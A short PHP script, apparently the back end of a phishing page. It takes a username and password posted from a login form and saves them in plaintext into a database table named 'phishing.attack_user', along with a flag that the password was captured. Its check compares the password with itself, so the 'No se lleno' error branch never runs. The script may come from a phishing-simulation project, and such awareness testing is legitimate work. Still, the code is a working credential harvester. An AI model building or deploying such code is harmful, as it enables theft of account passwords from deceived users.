<?php
require_once '../dbconexion.php';

$id = $_POST['uid'];
$user = $_POST['user'];
$pass = $_POST['contraseña'];

if($_POST['contraseña'] == $pass) {
    $passw = 1;

    $click = "UPDATE phishing.attack_user SET password_seen=?, user_password=?, user_username=? WHERE user_uid=?";
    $conexion->prepare($click)->execute([$passw, $pass, $user, $id]);
}
else
    echo 'No se lleno';
?>